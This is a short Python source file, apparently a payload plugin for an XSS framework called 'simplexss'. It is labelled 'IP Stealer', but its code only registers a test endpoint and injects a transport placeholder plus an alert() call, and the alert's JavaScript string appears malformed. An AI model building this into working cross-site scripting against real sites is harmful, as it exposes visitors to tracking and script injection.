from simplexss.api import (
    BasePayload,
    BaseClient,
    BaseEvent
)


class Payload(BasePayload):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Allows you to find out IP.'
    NAME = 'IP Stealer'
    VERSION = '0.0.1'

    async def on_test(self, client: BaseClient, event: BaseEvent):
        await self.io.print('Works!')
        await self.transport.send_event(client, BaseEvent(name='response'))

    def bind_endpoints(self):
        self.transport.bind_endpoint('test', self.on_test)

    @property
    def payload(self) -> str:
        return f'{{transport}}\nalert({self.NAME} - V{self.VERSION})'
